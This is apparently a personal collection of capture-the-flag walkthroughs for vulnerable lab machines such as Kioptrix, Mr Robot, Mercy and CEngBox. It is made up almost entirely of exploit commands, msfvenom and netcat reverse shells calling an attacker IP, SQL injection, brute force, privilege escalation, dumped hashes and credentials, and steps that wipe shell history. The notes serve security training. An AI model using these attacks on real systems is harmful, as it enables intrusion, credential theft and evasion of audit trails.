KIOPTRIX 1
LEVEL: EASY


1 -  netdiscover -r 192.168.1.0/24


--->  nmap -O 192.168.1.8  ----->  OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 

-> nmap -T4 -Pn -sS -p- -A  192.168.1.8

2 -  ./OpenFuck | grep 1.3.20
	./OpenFuck 0x6b 192.168.1.8 443 -c 40
	id -----> root
	-    cat /etc/passwd
	john:x:500:500::/home/john:/bin/bash
	harold:x:501:501::/home/harold:/bin/bash
	-   cat /etc/shadow
	 john:$1$zL4.MR4t$26N4YpTGceBO0gTX6TAky1:14513:0:99999:7:::
	harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:0:99999:7:::
	root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:0:99999:7:::

   

3 -    smb ,  netbios-ssn
	-  use auxiliary/scanner/smb/smb_version  
	Samba 2.2.1a
	-   exploit/linux/samba/trans2open
	-  set payload linux/x86/shell_reverse_tcp
	uid=0(root) gid=0(root) groups=99(nobody)


4 -   ssh 
ssh -l root 192.168.43.65 -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.1.8:22 -t 4 -V
using metasploit: use auxiliary/scanner/ssh/ssh_login

backdoor:
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh 
	-  sh shell.sh

#################################################################################################################################

KIOPTRIX 3
LEVEL: EASY

1 - port 80
in login page we have been found web frame work: LotusCMS
exploit/multi/http/lcms_php_exec
set URI /index.php

---->     awk 'BEGIN {system("/bin/bash")}' 


2 -    sqlmap 	-u 	http://kioptrix3.com/gallery/gallery.php?id=1	 --dump

+------+------------+----------------------------------+
| id   | username   | password                         |
+------+------------+----------------------------------+
| 1    | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 |  ------>    Mast3r
| 2    | loneferret | 5badcaf789d3d1d09794d8f021f40f0e |  --------> starwars
+------+------------+----------------------------------+


3 - 	ssh  -l  loneferret    192.168.1.9
cat CompanyPolicy.README
which ht
/usr/local/bin/ht

##################################################################################################################################

KIOPTRIX 5
LEVEL: EASY

1 - 80,8080 
searchsploit pChart
searchsploit -p exploits/php/webapps/31173.txt
cat /usr/share/exploitdb/exploits/php/webapps/31173.txt
--> we use this:
hxxp://localhost/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd

--> we take a look at page source html and then complete the uri:
http://192.168.1.10/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd
http://192.168.1.10/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2f/usr/local/etc/apache22/httpd.conf
------->

<VirtualHost *:8080>
    DocumentRoot /usr/local/www/apache22/data2

<Directory "/usr/local/www/apache22/data2">
    Options Indexes FollowSymLinks
    AllowOverride All
    Order allow,deny
    Allow from env=Mozilla4_browser
</Directory>



</VirtualHost>
------------------------------------------------>
It seems like only Mozilla4 browser is allowed to browse the website on that port.
Further Web Port Enumeration (Port 8080)
Burpsuite can be used to change the User-Agent to Mozilla/4.0 (Proxy -> Options) for every http request as per screenshot below.
Once the setting is on the intercept mode can be turned off.
The webpage now becomes available. -----> phptax

-------> use exploit/multi/http/phptax_exec

msf5 exploit(multi/http/phptax_exec) > set rhosts 192.168.1.10
rhosts => 192.168.1.10
msf5 exploit(multi/http/phptax_exec) > set rport 8080
rport => 8080
msf5 exploit(multi/http/phptax_exec) > exploit
uname -a
FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0


- nc -nvlp 9002 < /usr/share/exploitdb/exploits/freebsd/local/28718.c

- in target machine:
nc 192.168.1.9 9002 > exploit.c 

- gcc -o exploit exploit.c

- ./exploit

whoami

root
############################################################################################################################

KIOPTRIX 4
LEVEL: EASY

1- 
use auxiliary/scanner/smb/smb_enumusers
- KIOPTRIX4 [ nobody, robert, root, john, loneferret ] ( LockoutTries=0 PasswordMin=5 )

username:  john
password: 'or'a'='a ------> MyNameIsJohn

2- 
ssh -l john 192.168.1.7
echo os.system("/bin/bash")
cat /var/www/checkpoint.php
$host="localhost"; // Host name
$username="root"; // Mysql username
$password=""; // Mysql password
$db_name="members"; // Database name
$tbl_name="members"; // Table name
----->
ps -ef | grep mysql
locate udf
output shuold have: /usr/lib/lib_mysqludf_sys.so

mysql -u root -p (enter withoutpassword)
select * from mysql.func

- select sys_exec('usermod -a -G admin john')
NUll

- sudo su and write pass (MyNameIsJohn) and become root



##############################################################################################################################################

LAZYSYSADMIN

LEVEL: EASY


1 - # nmap -sS -Pn -sV -p21,22,25,80,8080,139,445 192.168.1.15

    # dirb http://192.168.1.15 -r
    ==> DIRECTORY: http://192.168.1.15/wordpress/ 

2 - smbclient -L \\192.168.1.15\\

3 - smbclient \\\\192.168.1.15\\share$

4 - inside smb basic shell:
    >ls
    >get todolist.txt
    >get deets.txt
    >cd wordpress/
    >get wp-config.php

5 -
vim wp-config.php

/** MySQL database username */
define('DB_USER', 'Admin');

/** MySQL database password */
define('DB_PASSWORD', 'TogieMYSQL12345^^');

/** MySQL hostname */
define('DB_HOST', 'localhost');
 

vim deets.txt 

BF Remembering all these passwords.

Remember to remove this file and update your password after we push out the server.

Password 12345


6 - use exploit/unix/webapp/wp_admin_shell_upload

meterpreter> shell

python -c 'import pty;pty.spawn("/bin/bash")'

$ id

$ su togie
Password: 12345

$  sudo su -
Password: 12345

root@LazySysAdmin:~# cat proof.txt

optional:

root@LazySysAdmin:~# cat /dev/null > ~/.bash_history && history -c     
(history cleared completely)

####################################################################################################################################################

CEngBox walkthrough

LEVEL:  EASY


1 - nmap -sS -T4 -Pn -A -p- 192.168.43.168

(nothing usefull!)

2 - dirb http://192.168.43.168 -r

(nothing usefull!)


3 - focusing on webpage and deeply scanning:

on webpage: cengover@cengbox.com user: cengover 

- dirb http://192.168.43.168 /usr/share/dirb/wordlists/big.txt

==> DIRECTORY: http://192.168.43.168/masteradmin/                              

- dirb http://192.168.43.168/masteradmin /usr/share/dirb/wordlists/common.txt  -X .php -r

---- Scanning URL: http://192.168.43.168/masteradmin/ ----
+ http://192.168.43.168/masteradmin/db.php (CODE:200|SIZE:0)                                                                                                                                 
+ http://192.168.43.168/masteradmin/login.php (CODE:200|SIZE:5137)                                                                                                                           
+ http://192.168.43.168/masteradmin/upload.php (CODE:200|SIZE:1440)                                                                                                                          
                                                                     

4 - in http://192.168.43.168/masteradmin/login.php we test login form for any possible SQL injection:

- sqlmap -u http://192.168.43.168/masteradmin/login.php --forms --dbs --batch

available databases [5]:
[*] cengbox
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys

- sqlmap -u http://192.168.43.168/masteradmin/login.php --forms -D cengbox  --dump-all --batch

Database: cengbox
Table: admin
[1 entry]
+----+---------------+-------------+
| id | password      | username    |
+----+---------------+-------------+
| 1  | C3ng0v3R00T1! | masteradmin |
+----+---------------+-------------+

5 -  then we login to upload page

NOTE: extension not allowed, please choose a CENG file

-  msfvenom -p  php/meterpreter/reverse_tcp LHOST=192.168.43.250 LPORT=445 -f raw > shell.php

-  mv shell.php shell.php.ceng

- curl  http://192.168.43.168/uploads/shell.php.ceng 


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.43.250:445 
[*] Sending stage (39282 bytes) to 192.168.43.168
[*] Meterpreter session 1 opened (192.168.43.250:445 -> 192.168.43.168:38520) at 2020-11-16 14:52:27 +0330

meterpreter > sysinfo
Computer    : cengbox
OS          : Linux cengbox 4.4.0-177-generic #207-Ubuntu SMP Mon Mar 16 01:16:10 UTC 2020 x86_64
Meterpreter : php/linux
meterpreter > 
Server username: www-data (33)
meterpreter> shell

python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data@cengbox:/var/www/html/uploads$ su cengover
Password: C3ng0v3R00T1!

cengover@cengbox:/$ 
user proof in /home:  8f7f6471e2e869f029a75c5de601d5e0



6 - ps aux | grep root


root      2299  0.0  0.0   4500   748 ?        Ss   15:34   0:00 /bin/sh -c /usr/bin/python3 /opt/md5check.py


>>>> we replace python2 reverse shell on md5check.py which has its own root access process :


cengover@cengbox:/opt$ echo 'import socket' > md5check.py

cengover@cengbox:/opt$ echo 'import subprocess' >> md5check.py

cengover@cengbox:/opt$ echo import os >> md5check.py

cengover@cengbox:/opt$ echo 's = socket.socket(socket.AF_INET, socket.SOCK_STREAM)' >> md5check.py

cengover@cengbox:/opt$ echo 's.connect(("192.168.43.250",4444))' >> md5check.py

cengover@cengbox:/opt$ echo 'os.dup2(s.fileno(), 0)' >> md5check.py

cengover@cengbox:/opt$ echo 'os.dup2(s.fileno(), 1)' >> md5check.py

cengover@cengbox:/opt$ echo 'os.dup2(s.fileno(), 2)' >> md5check.py

cengover@cengbox:/opt$ echo 'p=subprocess.call(["/bin/bash", "-i"])' >> md5check.py


7 - nc -nvlp 4444

root@cengbox:~# cat root.txt
cat root.txt
 / ____|  ____|           |  _ \           
| |    | |__   _ __   __ _| |_) | _____  __
| |    |  __| | '_ \ / _` |  _ < / _ \ \/ /
| |____| |____| | | | (_| | |_) | (_) >  < 
 \_____|______|_| |_|\__, |____/ \___/_/\_\
                      __/ |                
                     |___/                 

Congrats. Hope you enjoyed it and you can contact me on Twitter @arslanblcn_

a51e522b22a439b8e1b22d84f71cf0f2

------> clear history :

cengover@cengbox:/opt$ cat /dev/null > ~/.bash_history && history -c 

and

root@cengbox:~# cat /dev/null > ~/.bash_history && history -c

####################################################################################################################################################

Mr ROBOT walkthrough

LEVEL  EASY


1 - nmap -sS -Pn -sV -p21,22,25,80,8080,139,445 192.168.43.237

2 - dirb http://192.168.43.237/ -r

==> DIRECTORY: http://192.168.43.237/image/                                    
==> DIRECTORY: http://192.168.43.237/Image/                                    
+ http://192.168.43.237/robots (CODE:200|SIZE:41)                              
+ http://192.168.43.237/robots.txt (CODE:200|SIZE:41)  
+ http://192.168.43.237/login (CODE:302|SIZE:0)                                                               
==> DIRECTORY: http://192.168.43.237/wp-admin/  
+ http://192.168.43.237/wp-login (CODE:200|SIZE:2696)     
+ http://192.168.43.237//license.txt


3 - wpscan --url 192.168.43.237/ --enumerate ap,at,cb,dbe                     

4 - nikto -h http://192.168.43.237

-----> in robots.txt:
we found two file: dic and key
# curl http://192.168.43.237/key-1-of-3.txt

073403c8a58a1f80d943455fb30724b9


5 - hydra -t 64 -L fsocity.dic -p test  192.168.43.237 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid"

[80][http-post-form] host: 192.168.43.237   login: Elliot   password: test

---> now we found correct username


6 -  wpscan -t 10000 -U Elliot -P fsocity.dic --url http://192.168.43.237

[SUCCESS] - Elliot / ER28-0652  


7 - nc -nvlp 443


in Twenty Fifteen: 404 Template (404.php) page editor:

add: 

<?php 
exec("/bin/bash -c 'bash -i &> /dev/tcp/192.168.43.214/443 0>&1'");
?>

in first line before <?php
/**
 * The template for displaying 404 pages (not found)
 *
.........

8 - 
daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ cd /home/robot

daemon@linux:/home/robot$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b


daemon@linux:/opt/bitnami/apps/wordpress/htdocs$  python3 -c 'import pty;pty.spawn("/bin/sh")'


9 - in https://crackstation.net/ we cracked our hash:   abcdefghijklmnopqrstuvwxyz
robot@linux:~$ 

For this box, the strategy that worked was to locate an executable with suid bit enabled and use it run root-level commands:

( permission set as 4000)
robot@linux:~$ find / -perm  /4000 -type f 2>/dev/null
find / -perm  /4000 -type f 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device

10 - 
robot@linux:~$ nmap --interactive

nmap> !sh

# id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot) 
# cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4

DONE!
#######################################################################################################################################################

KB-VULN2 walkthrough

LEVEL EASY

1 - nmap -sS -Pn -sV -p21,22,25,80,8080,139,445 192.168.43.134
smb is open ...

2 - dirb http://192.168.43.134 -r

==> DIRECTORY: http://192.168.43.134/wordpress/ 

Test For Any possible anonymous login:

2 - smbclient -L \\\\192.168.43.134\\

3 - smbclient \\\\192.168.43.134\\Anonymous

smb:> get backup.zip 

4 - unzip backup.zip 

- vim remember_me.txt

Username:admin
Password:MachineBoy141

5 - use unix/webapp/wp_admin_shell_upload inmsfconsole to upload shell on authenticated wp web

meterpreter > getuid
Server username: www-data (33)
meterpreter > shell

python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data@kb-server:$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@kb-server:$ cat /etc/passwd

kbadmin:x:1000:1000:MachineBoy:/home/kbadmin:/bin/bash

www-data@kb-server:$ su kbadmin
Password: MachineBoy141

kbadmin@kb-server:$ id
id
uid=1000(kbadmin) gid=1000(kbadmin) groups=1000(kbadmin),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),999(docker)

kbadmin@kb-server:$ cd ../..
kbadmin@kb-server:$ cd home/
kbadmin@kb-server:$ cd kbadmin

6 - 

kbadmin@kb-server:~$ wget http://192.168.43.119:8090/ubuntu.tar 
----->(download ubuntu.tar docker image from my own system (its optional you can do it just by downloading image from docker hub))
kbadmin@kb-server:$ pwd
/home/kbadmin

7 - 

load image :

kbadmin@kb-server:~$ docker load < ubuntu.tar

kbadmin@kb-server:~$ docker images         
docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
<none>              <none>              72300a873c2c        8 months ago        64.2MB

----> my image didnt have any name so i should give something to it (you may not.....its optional)

kbadmin@kb-server:~$ docker image tag 72300a873c2c ubuntu:latest 

kbadmin@kb-server:~$ docker images
docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
ubuntu              latest              72300a873c2c        8 months ago        64.2MB


create docker container with file system volume:

kbadmin@kb-server:~$ docker run -itd -v /:/mnt ubuntu:latest
kbadmin@kb-server:~$ docker ps       
docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
7d55855a4035        ubuntu:latest       "/bin/bash"         26 seconds ago      Up 19 seconds                           interesting_solomon

kbadmin@kb-server:~$ docker exec -it interesting_solomon bash


root@7d55855a4035:/# cd mnt	

root@7d55855a4035:/mnt# cd root 

root@7d55855a4035:/mnt/root# ls
flag.txt

root@7d55855a4035:/mnt/root# cat flag.txt
dc387b4cf1a4143f562dd1bdb3790ff1

DONE !
##################################################################################################################################3##########

MERCY
LEVEL INTERMEDIATE

1 - nmap -sS -sC -sV -p- 192.168.43.250

2 - 
 
 - ls -l /usr/share/nmap/scripts/smb*
 
 - nmap -v -p 139,445 --script=smb-enum-users.nse 192.168.43.250

| smb-enum-users: 
|   MERCY\pleadformercy (RID: 1000)
|     Full name:   QIU
|     Description: 
|     Flags:       Normal user account
|   MERCY\qiu (RID: 1001)
|     Full name:   
|     Description: 
|_    Flags:       Normal user account


3 - hydra -l qiu -P /usr/share/wordlists/rockyou.txt 192.168.43.250 smb -t 1

[445][smb] host: 192.168.43.250   login: qiu   password: password


4 - smbclient \\\\192.168.43.250\\qiu -U qiu
    - get config
    - cat config

---> Port knocking! That is why NMAP returned filtered for both port 80 and 22.

[openHTTP]
        sequence    = 159,27391,4
        seq_timeout = 100
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
        tcpflags    = syn

I tried doing the port knocking sequence with NMAP but I couldn't get it to work.
So I downloaded the knockd package which also contains a program to send knock sequences.

└─# apt-get install knockd 


 - knock -v 192.168.43.250 159:tcp 27391:tcp 4:tcp

 -  nmap -sC -sV -p 80 192.168.43.250

 -  curl 192.168.43.250/mercy/


5 - curl 192.168.43.250/nomercy/
RIPS is a popular static code analysis tool to automatically detect vulnerabilities in PHP applications.

 - cat /usr/share/exploitdb/exploits/php/webapps/18660.txt 
 

6 - 
 - http://192.168.43.250/nomercy/windows/code.php?file=../../../../../../etc/passwd

 - http://192.168.43.250/nomercy/windows/code.php?file=../../../../../../etc/tomcat7/tomcat-users.xml 


	<? <role rolename="admin-gui"/>
	<? <role rolename="manager-gui"/>
	<? <user username="thisisasuperduperlonguser" password="heartbreakisinevitable" roles="admin-gui,manager-gui"/>
	<? <user username="fluffy" password="freakishfluffybunny" roles="none"/> 


 - dirb http://192.168.43.250:8080/manager/

+ http://192.168.43.250:8080/manager/html (CODE:401|SIZE:2474)                                                                                                                               

 
 - login in it with username="thisisasuperduperlonguser" password="heartbreakisinevitable" 



7 - msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.110 LPORT=8081 -f war -o reverse_shell.war


8 - curl http://192.168.43.250:8080/reverse_shell/

  - nc -lvnp 8081
  
  - python3 -c 'import pty;pty.spawn("/bin/sh")'

base on:
	<? <user username="fluffy" password="freakishfluffybunny" roles="none"/> 

9 - 
$ su fluffy
Password: freakishfluffybunny

10 - echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.110 9001 >/tmp/f" >> timeclock


#######################################################################################################################################################


mrr3b0t (192.168.43.180)

LEVEL EASY


1 - nmap -sS -T4 -Pn -A 192.168.43.180

2 - dirb http://192.168.43.180  /usr/share/dirb/wordlists/big.txt -r 
==> DIRECTORY: http://192.168.43.180/administrator/                                                                                                                                          
==> DIRECTORY: http://192.168.43.180/images/                                                                                                                                                 

3 -  

 -  wget http://192.168.43.180/images/hidden.png

 - upload that image in https://stylesuxx.github.io/steganography/

 - Did you find the message? Take the Mrrobot user and break your password, just don't think too much! ------> USER: Mrrobot

4 - bruteforce on login page:

└─# wfuzz -c -w /usr/share/wordlists/wfuzz/general/common.txt -d "username=mrrobot&pass=FUZZ" --hc 200 http://192.168.43.180/administrator/index.php

5 - msfvenom -p  php/meterpreter/reverse_tcp LHOST=192.168.43.214 LPORT=445 -f raw > shell.php

The image format must be jpg,jpeg,gif,png 

  - mv shell.php shell.png.php 
  
  - msfconsole .---> handler

  - curl -v http://192.168.43.180/administrator/shell.png.php

meterpreter > sysinfo
Computer    : mrr3b0t
OS          : Linux mrr3b0t 4.10.0-19-generic #21-Ubuntu SMP Thu Apr 6 17:04:57 UTC 2017 x86_64
Meterpreter : php/linux
meterpreter > getuid
Server username: www-data (33)
meterpreter > shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

6 -  cd ~
www-data@mrr3b0t:/var/www/bf$ cd bf
www-data@mrr3b0t:/var/www/bf$ strings buffer
Password@123

www-data@mrr3b0t:/var/www/bf$ cat /etc/passwd

exploiter:x:1000:1000:exploiter,,,:/home/exploiter:/bin/bash

www-data@mrr3b0t:/var/www$ su exploiter
su exploiter
Password: Password@123

exploiter@mrr3b0t:/var/www$
exploiter@mrr3b0t:/var/www$ id
uid=1000(exploiter) gid=1000(exploiter) groups=1000(exploiter),24(cdrom),30(dip),46(plugdev),111(lxd),118(lpadmin),119(sambashare)

root@kali: git clone https://github.com/saghul/lxd-alpine-builder.git

root@kali: cd lxd-alpine-builder

root@kali: ./build-alpine


exploiter@mrr3b0t:/var/www$ lxc image import ./alpine-v3.12-x86_64–20200924_1041.tar.gz — alias myimage


exploiter@mrr3b0t:/var/www$ lxc image list

exploiter@mrr3b0t:/var/www$ lxd init


exploiter@mrr3b0t:/var/www$ lxc init myimage ignite -c security.privileged=true


exploiter@mrr3b0t:/var/www$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true

exploiter@mrr3b0t:/var/www$ lxc start ignite

exploiter@mrr3b0t:/var/www$ lxc exec ignite /bin/sh
 
exploiter@mrr3b0t:/var/www$ id

exploiter@mrr3b0t:/var/www$  cd /mnt/root/root/ && cat flag.txt.txt

cat flag.txt.txt
                 uuuuuuu
             uu$$$$$$$$$$$uu
          uu$$$$$$$$$$$$$$$$$uu
         u$$$$$$$$$$$$$$$$$$$$$u
        u$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$"   "$$$"   "$$$$$$u
       "$$$$"      u$u       $$$$"
        $$$u       u$u       u$$$
        $$$u      u$$$u      u$$$
         "$$$$uu$$$   $$$uu$$$$"
          "$$$$$$$"   "$$$$$$$"
            u$$$$$$$u$$$$$$$u
             u$"$"$"$"$"$"$u
  uuu        $$u$ $ $ $ $u$$       uuu
 u$$$$        $$$$$u$u$u$$$       u$$$$
  $$$$$uu      "$$$$$$$$$"     uu$$$$$$
u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
 """      ""$$$$$$$$$$$uu ""$"""
           uuuu ""$$$$$$$$$$uuu
  u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
  $$$$$$$$$$""""           ""$$$$$$$$$$$"
   "$$$$$"                      ""$$$$""
     $$$"                         $$$$"

FLAG{3LEV4T0R_P3NT3ST}
#############################################################################################################################################################























